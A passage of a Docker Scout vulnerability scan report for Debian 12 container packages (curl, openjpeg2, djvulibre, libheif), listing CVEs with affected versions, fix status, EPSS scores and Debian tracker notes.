[bookworm] - curl 7.88.1-10+deb12u11
[bullseye] - curl <not-affected> (Vulnerable code introduced later)
https://curl.se/docs/CVE-2025-0167.html
Introduced with: https://github.com/curl/curl/commit/46620b97431e19c53ce82e55055c85830f088cf4 (curl-7_76_0)
Fixed by: https://github.com/curl/curl/commit/0e120c5b925e8ca75d5319e319e5ce4b8080d8eb (curl-8_12_0)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-2379?s=debian&n=curl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D7.88.1-10%2Bdeb12u14"><img alt="low : CVE--2024--2379" src="https://img.shields.io/badge/CVE--2024--2379-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=7.88.1-10+deb12u14</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.205%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>43rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

libcurl skips the certificate verification for a QUIC connection under certain conditions, when built to use wolfSSL. If told to use an unknown/bad cipher or curve, the error path accidentally skips the verification and returns OK, thus ignoring any certificate problems.

---
- curl 8.7.1-1 (unimportant)
https://curl.se/docs/CVE-2024-2379.html
Introduced by: https://github.com/curl/curl/commit/5d044ad9480a9f556f4b6a252d7533b1ba7fe57e (curl-8_6_0)
Fixed by: https://github.com/curl/curl/commit/aedbbdf18e689a5eee8dc39600914f5eda6c409c (curl-8_7_0)
curl in Debian not built with wolfSSL support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-2004?s=debian&n=curl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C7.88.1-10%2Bdeb12u6"><img alt="low : CVE--2024--2004" src="https://img.shields.io/badge/CVE--2024--2004-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><7.88.1-10+deb12u6</code></td></tr>
<tr><td>Fixed version</td><td><code>7.88.1-10+deb12u6</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.838%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>74th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When a protocol selection parameter option disables all protocols without adding any then the default set of protocols would remain in the allowed set due to an error in the logic for removing protocols. The below command would perform a request to curl.se with a plaintext protocol which has been explicitly disabled.      curl --proto -all,-http http://curl.se  The flaw is only present if the set of selected protocols disables the entire set of available protocols, in itself a command with no practical use and therefore unlikely to be encountered in real situations. The curl security team has thus assessed this to be low severity bug.

---
- curl 8.7.1-1
[bookworm] - curl 7.88.1-10+deb12u6
[bullseye] - curl <not-affected> (Vulnerable code not present)
[buster] - curl <not-affected> (Vulnerable code not present)
https://curl.se/docs/CVE-2024-2004.html
Introduced by: https://github.com/curl/curl/commit/e6f8445edef8e7996d1cfb141d6df184efef972c (curl-7_85_0)
Fixed by: https://github.com/curl/curl/commit/17d302e56221f5040092db77d4f85086e8a20e0e (curl-8_7_0)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-11053?s=debian&n=curl&ns=debian&t=deb&osn=debian&osv=12&vr=%3C7.88.1-10%2Bdeb12u10"><img alt="low : CVE--2024--11053" src="https://img.shields.io/badge/CVE--2024--11053-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><7.88.1-10+deb12u10</code></td></tr>
<tr><td>Fixed version</td><td><code>7.88.1-10+deb12u10</code></td></tr>
<tr><td>EPSS Score</td><td><code>1.034%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>77th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

When asked to both use a `.netrc` file for credentials and to follow HTTP redirects, curl could leak the password used for the first host to the followed-to host under certain circumstances.  This flaw only manifests itself if the netrc file has an entry that matches the redirect target hostname but the entry either omits just the password or omits both login and password.

---
- curl 8.11.1-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1089682)
[bookworm] - curl 7.88.1-10+deb12u10
[bullseye] - curl <not-affected> (Vulnerable code only introduced in 7.76.0)
https://curl.se/docs/CVE-2024-11053.html
Introduced by: https://github.com/curl/curl/commit/46620b97431e19c53ce82e55055c85830f088cf4 (curl-7_76_0)
Fixed by: https://github.com/curl/curl/commit/e9b9bbac22c26cf67316fa8e6c6b9e831af31949 (curl-8_11_1)

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 3" src="https://img.shields.io/badge/M-3-fbb552"/> <img alt="low: 9" src="https://img.shields.io/badge/L-9-fce1a9"/> <!-- unspecified: 0 --><strong>openjpeg2</strong> <code>2.5.0-2</code> (deb)</summary>

<small><code>pkg:deb/debian/openjpeg2@2.5.0-2?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2021-3575?s=debian&n=openjpeg2&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.5.0-2%2Bdeb12u1"><img alt="high : CVE--2021--3575" src="https://img.shields.io/badge/CVE--2021--3575-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.5.0-2+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>2.5.0-2+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.330%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>55th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A heap-based buffer overflow was found in openjpeg in color.c:379:42 in sycc420_to_rgb when decompressing a crafted .j2k file. An attacker could use this to execute arbitrary code with the permissions of the application compiled against openjpeg.

---
[experimental] - openjpeg2 2.5.3-1~exp1
- openjpeg2 2.5.3-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=989775)
[buster] - openjpeg2 <no-dsa> (Minor issue)
[stretch] - openjpeg2 <no-dsa> (Minor issue)
https://github.com/uclouvain/openjpeg/issues/1347
https://github.com/uclouvain/openjpeg/pull/1509
Fixed by: https://github.com/uclouvain/openjpeg/commit/7bd884f8750892de4f50bf4642fcfbe7011c6bdf (v2.5.1)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-50952?s=debian&n=openjpeg2&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.5.0-2%2Bdeb12u2"><img alt="medium : CVE--2025--50952" src="https://img.shields.io/badge/CVE--2025--50952-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.5.0-2+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><code>2.5.0-2+deb12u2</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.039%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>11th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

openjpeg v 2.5.0 was discovered to contain a NULL pointer dereference via the component /openjp2/dwt.c.

---
- openjpeg2 2.5.3-1
[bookworm] - openjpeg2 2.5.0-2+deb12u2
https://github.com/uclouvain/openjpeg/issues/1505
Fixed by: https://github.com/uclouvain/openjpeg/commit/d903fbb4ab9ccf9b96c8bc7398fafc0007505a37 (v2.5.1)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-56827?s=debian&n=openjpeg2&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.5.0-2%2Bdeb12u1"><img alt="medium : CVE--2024--56827" src="https://img.shields.io/badge/CVE--2024--56827-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.5.0-2+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>2.5.0-2+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.066%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>21st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in the OpenJPEG project. A heap buffer overflow condition may be triggered when certain options are specified while using the opj_decompress utility.  This can lead to an application crash or other undefined behavior.

---
[experimental] - openjpeg2 2.5.3-1~exp1
- openjpeg2 2.5.3-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1092676)
https://bugzilla.redhat.com/show_bug.cgi?id=2335174
https://github.com/uclouvain/openjpeg/issues/1564
https://github.com/uclouvain/openjpeg/commit/e492644fbded4c820ca55b5e50e598d346e850e8 (v2.5.3)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-56826?s=debian&n=openjpeg2&ns=debian&t=deb&osn=debian&osv=12&vr=%3C2.5.0-2%2Bdeb12u1"><img alt="medium : CVE--2024--56826" src="https://img.shields.io/badge/CVE--2024--56826-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><2.5.0-2+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>2.5.0-2+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.061%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>19th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in the OpenJPEG project. A heap buffer overflow condition may be triggered when certain options are specified while using the opj_decompress utility.  This can lead to an application crash or other undefined behavior.

---
[experimental] - openjpeg2 2.5.3-1~exp1
- openjpeg2 2.5.3-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1092675)
https://bugzilla.redhat.com/show_bug.cgi?id=2335172
https://github.com/uclouvain/openjpeg/issues/1563
https://github.com/uclouvain/openjpeg/commit/98592ee6d6904f1b48e8207238779b89a63befa2 (v2.5.3)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2018-16376?s=debian&n=openjpeg2&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.5.0-2%2Bdeb12u2"><img alt="low : CVE--2018--16376" src="https://img.shields.io/badge/CVE--2018--16376-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.5.0-2+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.566%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>68th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in OpenJPEG 2.3.0. A heap-based buffer overflow was discovered in the function t2_encode_packet in lib/openmj2/t2.c. The vulnerability causes an out-of-bounds write, which may lead to remote denial of service or possibly unspecified other impact.

---
- openjpeg2 <unfixed> (unimportant)
https://github.com/uclouvain/openjpeg/issues/1127
We build with -DBUILD_MJ2:BOOL=OFF

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2016-9581?s=debian&n=openjpeg2&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.5.0-2%2Bdeb12u2"><img alt="low : CVE--2016--9581" src="https://img.shields.io/badge/CVE--2016--9581-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.5.0-2+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.352%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>57th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An infinite loop vulnerability in tiftoimage that results in heap buffer overflow in convert_32s_C1P1 was found in openjpeg 2.1.2.

---
- openjpeg2 <unfixed> (unimportant)
https://github.com/uclouvain/openjpeg/issues/872
Fixed by: https://github.com/szukw000/openjpeg/commit/cadff5fb6e73398de26a92e96d3d7cac893af255
not built into the binary packages

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2016-9580?s=debian&n=openjpeg2&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.5.0-2%2Bdeb12u2"><img alt="low : CVE--2016--9580" src="https://img.shields.io/badge/CVE--2016--9580-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.5.0-2+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.396%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>60th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An integer overflow vulnerability was found in tiftoimage function in openjpeg 2.1.2, resulting in heap buffer overflow.

---
- openjpeg2 <unfixed> (unimportant)
https://github.com/uclouvain/openjpeg/issues/871
Fixed by: https://github.com/szukw000/openjpeg/commit/cadff5fb6e73398de26a92e96d3d7cac893af255
not built into the binary packages

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2016-9117?s=debian&n=openjpeg2&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.5.0-2%2Bdeb12u2"><img alt="low : CVE--2016--9117" src="https://img.shields.io/badge/CVE--2016--9117-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.5.0-2+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.581%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>68th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

NULL Pointer Access in function imagetopnm of convert.c(jp2):1289 in OpenJPEG 2.1.2. Impact is Denial of Service. Someone must open a crafted j2k file.

---
- openjpeg2 <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=844556)
https://github.com/uclouvain/openjpeg/issues/860
No code injection, function only exposed in the CLI tool

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2016-9116?s=debian&n=openjpeg2&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.5.0-2%2Bdeb12u2"><img alt="low : CVE--2016--9116" src="https://img.shields.io/badge/CVE--2016--9116-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.5.0-2+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.581%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>68th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

NULL Pointer Access in function imagetopnm of convert.c:2226(jp2) in OpenJPEG 2.1.2. Impact is Denial of Service. Someone must open a crafted j2k file.

---
- openjpeg2 <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=844555)
https://github.com/uclouvain/openjpeg/issues/859
No code injection, function only exposed in the CLI tool

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2016-9115?s=debian&n=openjpeg2&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.5.0-2%2Bdeb12u2"><img alt="low : CVE--2016--9115" src="https://img.shields.io/badge/CVE--2016--9115-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.5.0-2+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.374%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>59th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Heap Buffer Over-read in function imagetotga of convert.c(jp2):942 in OpenJPEG 2.1.2. Impact is Denial of Service. Someone must open a crafted j2k file.

---
- openjpeg2 <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=844554)
https://github.com/uclouvain/openjpeg/issues/858
No code injection, function only exposed in the CLI tool

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2016-9114?s=debian&n=openjpeg2&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.5.0-2%2Bdeb12u2"><img alt="low : CVE--2016--9114" src="https://img.shields.io/badge/CVE--2016--9114-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.5.0-2+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.478%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>64th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

There is a NULL Pointer Access in function imagetopnm of convert.c:1943(jp2) of OpenJPEG 2.1.2. image->comps[compno].data is not assigned a value after initialization(NULL). Impact is Denial of Service.

---
- openjpeg2 <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=844553)
https://github.com/uclouvain/openjpeg/issues/857
No code injection, function only exposed in the CLI tool

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2016-9113?s=debian&n=openjpeg2&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.5.0-2%2Bdeb12u2"><img alt="low : CVE--2016--9113" src="https://img.shields.io/badge/CVE--2016--9113-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.5.0-2+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.448%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>63rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

There is a NULL pointer dereference in function imagetobmp of convertbmp.c:980 of OpenJPEG 2.1.2. image->comps[0].data is not assigned a value after initialization(NULL). Impact is Denial of Service.

---
- openjpeg2 <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=844552)
https://github.com/uclouvain/openjpeg/issues/856
No code injection, function only exposed in the CLI tool

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2016-10505?s=debian&n=openjpeg2&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D2.5.0-2%2Bdeb12u2"><img alt="low : CVE--2016--10505" src="https://img.shields.io/badge/CVE--2016--10505-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=2.5.0-2+deb12u2</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.656%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>70th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

NULL pointer dereference vulnerabilities in the imagetopnm function in convert.c, sycc444_to_rgb function in color.c, color_esycc_to_rgb function in color.c, and sycc422_to_rgb function in color.c in OpenJPEG before 2.2.0 allow remote attackers to cause a denial of service (application crash) via crafted j2k files.

---
- openjpeg2 <unfixed> (unimportant)
https://github.com/uclouvain/openjpeg/issues/776
https://github.com/uclouvain/openjpeg/issues/784
https://github.com/uclouvain/openjpeg/issues/785
https://github.com/uclouvain/openjpeg/issues/792

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 2" src="https://img.shields.io/badge/M-2-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>djvulibre</strong> <code>3.5.28-2</code> (deb)</summary>

<small><code>pkg:deb/debian/djvulibre@3.5.28-2?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-53367?s=debian&n=djvulibre&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.5.28-2.1%7Edeb12u1"><img alt="high : CVE--2025--53367" src="https://img.shields.io/badge/CVE--2025--53367-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.5.28-2.1~deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>3.5.28-2.1~deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.011%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>1st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

DjVuLibre is a GPL implementation of DjVu, a web-centric format for distributing documents and images. Prior to version 3.5.29, the MMRDecoder::scanruns method is affected by an OOB-write vulnerability, because it does not check that the xr pointer stays within the bounds of the allocated buffer. This can lead to writes beyond the allocated memory, resulting in a heap corruption condition. An out-of-bounds read with pr is also possible for the same reason. This issue has been patched in version 3.5.29.

---
- djvulibre 3.5.28-2.1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1108729)
https://www.openwall.com/lists/oss-security/2025/07/03/1
Fixed by: https://sourceforge.net/p/djvu/djvulibre-git/ci/33f645196593d70bd5e37f55b63886c31c82c3da/
https://github.com/github/securitylab/tree/main/SecurityExploits/DjVuLibre/MMRDecoder_scanruns_CVE-2025-53367

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2021-46312?s=debian&n=djvulibre&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.5.28-2.2%7Edeb12u1"><img alt="medium : CVE--2021--46312" src="https://img.shields.io/badge/CVE--2021--46312-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.5.28-2.2~deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>3.5.28-2.2~deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.258%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>49th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered IW44EncodeCodec.cpp in djvulibre 3.5.28 in allows attackers to cause a denial of service via divide by zero.

---
- djvulibre 3.5.28-2.2 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1052669)
[bookworm] - djvulibre 3.5.28-2.2~deb12u1
[buster] - djvulibre <no-dsa> (Minor issue)
https://sourceforge.net/p/djvu/bugs/344/
Fixed by: (only IW44EncodeCodec.cpp changes): https://sourceforge.net/p/djvu/djvulibre-git/ci/05d00e831a5c55af2d407a513a9157a03449dc2c/

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2021-46310?s=debian&n=djvulibre&ns=debian&t=deb&osn=debian&osv=12&vr=%3C3.5.28-2.2%7Edeb12u1"><img alt="medium : CVE--2021--46310" src="https://img.shields.io/badge/CVE--2021--46310-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><3.5.28-2.2~deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>3.5.28-2.2~deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.258%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>49th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered IW44Image.cpp in djvulibre 3.5.28 in allows attackers to cause a denial of service via divide by zero.

---
- djvulibre 3.5.28-2.2 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1052668)
[bookworm] - djvulibre 3.5.28-2.2~deb12u1
[buster] - djvulibre <no-dsa> (Minor issue)
https://sourceforge.net/p/djvu/bugs/345/
https://sourceforge.net/p/djvu/djvulibre-git/ci/cd8b5c97b27a5c1dc83046498b6ca49ad20aa9b6/

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 1" src="https://img.shields.io/badge/H-1-e25d68"/> <img alt="medium: 1" src="https://img.shields.io/badge/M-1-fbb552"/> <img alt="low: 3" src="https://img.shields.io/badge/L-3-fce1a9"/> <!-- unspecified: 0 --><strong>libheif</strong> <code>1.15.1-1</code> (deb)</summary>

<small><code>pkg:deb/debian/libheif@1.15.1-1?os_distro=bookworm&os_name=debian&os_version=12</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-41311?s=debian&n=libheif&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1.15.1-1%2Bdeb12u1"><img alt="high : CVE--2024--41311" src="https://img.shields.io/badge/CVE--2024--41311-lightgrey?label=high%20&labelColor=e25d68"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.15.1-1+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>1.15.1-1+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.125%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>32nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In Libheif 1.17.6, insufficient checks in ImageOverlay::parse() decoding a heif file containing an overlay image with forged offsets can lead to an out-of-bounds read and write.

---
- libheif 1.18.1-1
https://github.com/strukturag/libheif/issues/1226
https://github.com/strukturag/libheif/pull/1227
https://github.com/strukturag/libheif/commit/a3ed1b1eb178c5d651d6ac619c8da3d71ac2be36 (v1.18.0)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-29659?s=debian&n=libheif&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1.15.1-1%2Bdeb12u1"><img alt="medium : CVE--2023--29659" src="https://img.shields.io/badge/CVE--2023--29659-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.15.1-1+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>1.15.1-1+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.136%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>34th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A Segmentation fault caused by a floating point exception exists in libheif 1.15.1 using crafted heif images via the heif::Fraction::round() function in box.cc, which causes a denial of service.

---
- libheif 1.16.2-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1035607)
[buster] - libheif <no-dsa> (Minor issue)
https://github.com/strukturag/libheif/issues/794
https://github.com/strukturag/libheif/commit/e05e15b57a38ec411cb9acb38512a1c36ff62991 (v1.15.2)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-25269?s=debian&n=libheif&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D1.15.1-1%2Bdeb12u1"><img alt="low : CVE--2024--25269" src="https://img.shields.io/badge/CVE--2024--25269-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=1.15.1-1+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.050%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>16th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

libheif <= 1.17.6 contains a memory leak in the function JpegEncoder::Encode. This flaw allows an attacker to cause a denial of service attack.

---
- libheif 1.17.6-2 (unimportant)
https://github.com/strukturag/libheif/issues/1073
https://github.com/strukturag/libheif/pull/1074
https://github.com/strukturag/libheif/commit/877de6b398198bca387df791b9232922c5721c80
Memory leak in example code

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-49463?s=debian&n=libheif&ns=debian&t=deb&osn=debian&osv=12&vr=%3C%3D1.15.1-1%2Bdeb12u1"><img alt="low : CVE--2023--49463" src="https://img.shields.io/badge/CVE--2023--49463-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><=1.15.1-1+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.146%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>35th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

libheif v1.17.5 was discovered to contain a segmentation violation via the function find_exif_tag at /libheif/exif.cc.

---
- libheif 1.17.6-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1059151; unimportant)
[buster] - libheif <not-affected> (Vulnerable code not present)
https://github.com/strukturag/libheif/issues/1042
https://github.com/strukturag/libheif/commit/26ec3953d46bb5756b97955661565bcbc6647abf (v1.17.6)
Crash in CLI tool, no security impact (only affects example tool shipped in libheif-examples)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-49462?s=debian&n=libheif&ns=debian&t=deb&osn=debian&osv=12&vr=%3C1.15.1-1%2Bdeb12u1"><img alt="low : CVE--2023--49462" src="https://img.shields.io/badge/CVE--2023--49462-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code><1.15.1-1+deb12u1</code></td></tr>
<tr><td>Fixed version</td><td><code>1.15.1-1+deb12u1</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.128%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>33rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

libheif v1.17.5 was discovered to contain a segmentation violation via the component /libheif/exif.cc.

---
- libheif 1.17.6-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1059151)
[bullseye] - libheif <not-affected> (Vulnerable code not present)
[buster] - libheif <not-affected> (Vulnerable code not present)
https://github.com/strukturag/libheif/issues/1043
https://github.com/strukturag/libheif/commit/730a9d80bea3434f75c79e721878cc67f3889969 (v1.17.6)

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
